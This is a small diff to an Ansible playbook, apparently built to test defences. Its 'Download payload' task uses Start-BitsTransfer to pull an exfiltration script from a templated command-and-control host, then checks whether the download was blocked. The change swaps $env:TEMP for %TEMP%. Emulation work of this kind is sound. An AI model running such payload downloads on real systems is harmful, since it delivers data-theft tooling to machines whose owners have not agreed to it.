@@ -7,7 +7,7 @@
           - name: Download payload
             tags: always
             win_shell: |
-              Start-BitsTransfer -Priority foreground -Source https://{{ cnc_fqdn }}:{{ cnc_port }}/{{ exfil_script_windows }} -Destination $env:TEMP\bitsadmin_flag.ps1
+              Start-BitsTransfer -Priority foreground -Source https://{{ cnc_fqdn }}:{{ cnc_port }}/{{ exfil_script_windows }} -Destination %TEMP%\bitsadmin_flag.ps1
           - name: sleep for 10 seconds and continue with play if download was blocked or not
             tags: always
             wait_for: timeout=10
